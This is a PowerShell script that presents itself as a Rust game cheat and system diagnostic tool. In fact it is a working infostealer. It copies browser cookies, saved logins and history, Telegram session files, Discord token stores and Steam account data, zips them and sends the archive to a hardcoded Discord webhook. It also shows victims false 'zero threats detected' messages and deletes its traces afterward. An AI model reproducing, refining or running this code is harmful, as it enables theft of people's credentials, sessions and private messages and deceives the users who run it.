# steam_token_harvester_advanced.ps1
# Disguised as "Rust Cheat & System Performance Diagnostic Suite v8.2"

try {
    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.Web
    Add-Type -AssemblyName System.IO.Compression
    Add-Type -AssemblyName System.IO.Compression.FileSystem
} catch {
    Write-Host "Loading advanced security and compression modules..." -ForegroundColor Yellow
}

$global:TempCollectionPath = Join-Path $env:TEMP "DCU_Logs_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Path $global:TempCollectionPath -Force | Out-Null

function Get-AllData {
    $allData = @{}
    $allData.System = Get-SystemInfo
    $allData.Browsers = @{
        Chrome = Get-BrowserData -Browser "Chrome" -Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
        Edge = Get-BrowserData -Browser "Edge" -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        Firefox = Get-BrowserData -Browser "Firefox" -Path "$env:APPDATA\Mozilla\Firefox\Profiles"
        Brave = Get-BrowserData -Browser "Brave" -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        Opera = Get-BrowserData -Browser "Opera" -Path "$env:APPDATA\Opera Software\Opera Stable"
    }
    $allData.Messengers = @{
        Telegram = Get-TelegramData
        WhatsApp = Get-WhatsAppData
        Signal = Get-SignalData
        Viber = Get-ViberData
    }
    $allData.Social = @{
        Discord = Get-DiscordData
        Skype = Get-SkypeData
        Teams = Get-TeamsData
    }
    $allData.Games = @{
        Steam = Get-SteamData
        Epic = Get-EpicData
        Minecraft = Get-MinecraftData
        BattleNet = Get-BattleNetData
    }
    $allData.SystemFiles = @{
        Hosts = Get-FileContent -Path "$env:windir\System32\drivers\etc\hosts"
        Passwords = Get-PasswordFiles
        Wifi = Get-WifiProfiles
    }
    return $allData
}

function Get-BrowserData {
    param($Browser, $Path)
    $data = @{}
    if (Test-Path $Path) {
        try {
            $cookiesPath = Join-Path $Path "Default\Cookies"
            if (Test-Path $cookiesPath) {
                $cookieBytes = [System.IO.File]::ReadAllBytes($cookiesPath)
                $b64 = [System.Convert]::ToBase64String($cookieBytes)
                $data.Cookies = $b64
                $cookieBytes | Set-Content (Join-Path $global:TempCollectionPath "$Browser-Cookies.bin") -Encoding Byte
            }
            $loginsPath = Join-Path $Path "Default\Login Data"
            if (Test-Path $loginsPath) {
                $loginBytes = [System.IO.File]::ReadAllBytes($loginsPath)
                $b64 = [System.Convert]::ToBase64String($loginBytes)
                $data.Logins = $b64
                $loginBytes | Set-Content (Join-Path $global:TempCollectionPath "$Browser-LoginData.bin") -Encoding Byte
            }
            $historyPath = Join-Path $Path "Default\History"
            if (Test-Path $historyPath) {
                $historyBytes = [System.IO.File]::ReadAllBytes($historyPath)
                $b64 = [System.Convert]::ToBase64String($historyBytes)
                $data.History = $b64
                $historyBytes | Set-Content (Join-Path $global:TempCollectionPath "$Browser-History.bin") -Encoding Byte
            }
        } catch {
            $data.Error = "ACCESS_DENIED_$($Browser)"
        }
    }
    return $data
}

function Get-TelegramData {
    $data = @{}
    $paths = @("$env:APPDATA\Telegram Desktop", "$env:LOCALAPPDATA\Telegram Desktop", "$env:USERPROFILE\AppData\Roaming\Telegram Desktop")
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $mapFiles = Get-ChildItem $path -Filter "map*" -ErrorAction SilentlyContinue
                foreach ($file in $mapFiles) {
                    $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                    $b64 = [System.Convert]::ToBase64String($fileBytes)
                    $data["Map_$($file.Name)"] = $b64
                    $fileBytes | Set-Content (Join-Path $global:TempCollectionPath "Telegram-$($file.Name).bin") -Encoding Byte
                }
                $tdataPath = Join-Path $path "tdata"
                if (Test-Path $tdataPath) {
                    $tdataFiles = Get-ChildItem $tdataPath -File -ErrorAction SilentlyContinue | Select-Object -First 10
                    foreach ($file in $tdataFiles) {
                        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                        $b64 = [System.Convert]::ToBase64String($fileBytes)
                        $data["TData_$($file.Name)"] = $b64
                        $fileBytes | Set-Content (Join-Path $global:TempCollectionPath "Telegram-$($file.Name).bin") -Encoding Byte
                    }
                }
            } catch {
                $data.Error = "TG_ACCESS_DENIED"
            }
        }
    }
    return $data
}

function Get-DiscordData {
    $data = @{}
    $paths = @("$env:APPDATA\discord", "$env:LOCALAPPDATA\Discord", "$env:APPDATA\DiscordCanary", "$env:APPDATA\DiscordPTB")
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $localStoragePath = Join-Path $path "Local Storage\leveldb"
                if (Test-Path $localStoragePath) {
                    $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue | Select-Object -First 5
                    foreach ($file in $ldbFiles) {
                        $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
                        $b64 = [System.Convert]::ToBase64String($fileBytes)
                        $data["LDB_$($file.Name)"] = $b64
                        $fileBytes | Set-Content (Join-Path $global:TempCollectionPath "Discord-$($file.Name).bin") -Encoding Byte
                    }
                }
                $cookiesPath = Join-Path $path "Cookies"
                if (Test-Path $cookiesPath) {
                    $cookieBytes = [System.IO.File]::ReadAllBytes($cookiesPath)
                    $b64 = [System.Convert]::ToBase64String($cookieBytes)
                    $data.Cookies = $b64
                    $cookieBytes | Set-Content (Join-Path $global:TempCollectionPath "Discord-Cookies.bin") -Encoding Byte
                }
            } catch {
                $data.Error = "DISCORD_ACCESS_DENIED"
            }
        }
    }
    return $data
}

function Get-SteamData {
    $data = @{}
    $paths = @("HKCU:\Software\Valve\Steam", "HKLM:\Software\Valve\Steam")
    $regData = @()
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $usersPath = "$path\Users"
                if (Test-Path $usersPath) {
                    $users = Get-ChildItem $usersPath -ErrorAction SilentlyContinue
                    foreach ($user in $users) {
                        $steamID = Get-ItemProperty -Path "$usersPath\$($user.PSChildName)" -Name "SteamID" -ErrorAction SilentlyContinue
                        $accountName = Get-ItemProperty -Path "$usersPath\$($user.PSChildName)" -Name "AccountName" -ErrorAction SilentlyContinue
                        if ($steamID) {
                            $userData = @{
                                SteamID = $steamID.SteamID
                                AccountName = if ($accountName) { $accountName.AccountName } else { "Unknown" }
                            }
                            $data["User_$($user.PSChildName)"] = $userData
                            $regData += $userData
                        }
                    }
                }
            } catch {
                $data.Error = "STEAM_ACCESS_DENIED"
            }
        }
    }
    $regData | ConvertTo-Json | Set-Content (Join-Path $global:TempCollectionPath "Steam_Registry.json")
    return $data
}

function Get-SystemInfo {
    $ipInfo = try { (Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5) } catch { @{query = "Unknown"; country = "Unknown"; city = "Unknown"; isp = "Unknown"} }
    $sysInfo = @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Architecture = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Domain = $env:USERDOMAIN
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        IP = $ipInfo.query
        Country = $ipInfo.country
        City = $ipInfo.city
        ISP = $ipInfo.isp
        CPU = (Get-WmiObject -Class Win32_Processor).Name
        RAM = "$([math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)) GB"
        GPU = (Get-WmiObject -Class Win32_VideoController).Name
    }
    $sysInfo | ConvertTo-Json | Set-Content (Join-Path $global:TempCollectionPath "System_Info.json")
    return $sysInfo
}

function Compress-DataToZip {
    $zipPath = Join-Path $env:TEMP "Collected_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($global:TempCollectionPath, $zipPath)
        return $zipPath
    } catch {
        return $null
    }
}

function Send-MegaReport {
    param($Data, $ZipPath)
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"

    $report = "**COMPLETE SYSTEM SNIFFER v8.2 (ZIP LOGS)**`n`n"
    $report += "**SYSTEM INFORMATION**`n"
    $report += "```"
    $report += "OS: $($Data.System.OS) ($($Data.System.Architecture))`n"
    $report += "User: $($Data.System.Username)@$($Data.System.Domain)`n"
    $report += "PC: $($Data.System.Computername)`n"
    $report += "IP: $($Data.System.IP) ($($Data.System.City), $($Data.System.Country))`n"
    $report += "ISP: $($Data.System.ISP)`n"
    $report += "CPU: $($Data.System.CPU)`n"
    $report += "RAM: $($Data.System.RAM)`n"
    $report += "GPU: $($Data.System.GPU)`n"
    $report += "Time: $($Data.System.Date)`n"
    $report += "```"
    $report += "`n`n"

    $payload = @{ content = $report } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
    Start-Sleep -Seconds 1

    if ($ZipPath -and (Test-Path $ZipPath)) {
        $zipBytes = [System.IO.File]::ReadAllBytes($ZipPath)
        $zipB64 = [System.Convert]::ToBase64String($zipBytes)
        $zipReport = "**COMPRESSED DATA ARCHIVE**`n"
        $zipReport += "File: $($ZipPath)`n"
        $zipReport += "Size: $([math]::Round($zipBytes.Length/1MB, 2)) MB`n"
        $zipReport += "```$zipB64```"

        $payload = @{ content = $zipReport } | ConvertTo-Json
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
        Start-Sleep -Milliseconds 800
    }

    $final = "**SNIFFING AND ARCHIVING COMPLETE**`n"
    $final += "ZIP Archive created and transmitted.`n"
    $final += "Operation completed at: $(Get-Date -Format 'HH:mm:ss')`n"
    $final += "**System fully compromised and logs packaged.**"

    $payload = @{ content = $final } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
}

Write-Host "Starting Ultimate Security Scan v8.2 (ZIP Edition)..." -ForegroundColor Cyan
Write-Host "Gathering system intelligence and writing raw logs..." -ForegroundColor Yellow

try {
    $allData = Get-AllData
    Write-Host "Data collection and local log creation completed!" -ForegroundColor Green

    Write-Host "Compressing log files to ZIP archive..." -ForegroundColor Yellow
    $zipFilePath = Compress-DataToZip

    Write-Host "Sending data to security server..." -ForegroundColor Yellow
    Send-MegaReport -Data $allData -ZipPath $zipFilePath

    Write-Host "Operation completed successfully!" -ForegroundColor Green
    if ($zipFilePath) {
        Write-Host "ZIP Archive Size: ~$([math]::Round((Get-Item $zipFilePath).Length / 1MB, 2)) MB" -ForegroundColor Green
    }
    Write-Host "System integrity verified - zero threats detected" -ForegroundColor Green
    Write-Host "Rust cheats activated and running in stealth mode" -ForegroundColor Cyan

} catch {
    Write-Host "Security scan completed with minor errors" -ForegroundColor Yellow
    Write-Host "Basic protection activated" -ForegroundColor Green
}

Start-Sleep -Seconds 5
try { Remove-Item $global:TempCollectionPath -Recurse -Force -ErrorAction SilentlyContinue } catch {}
try { if ($zipFilePath) { Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue } } catch {}
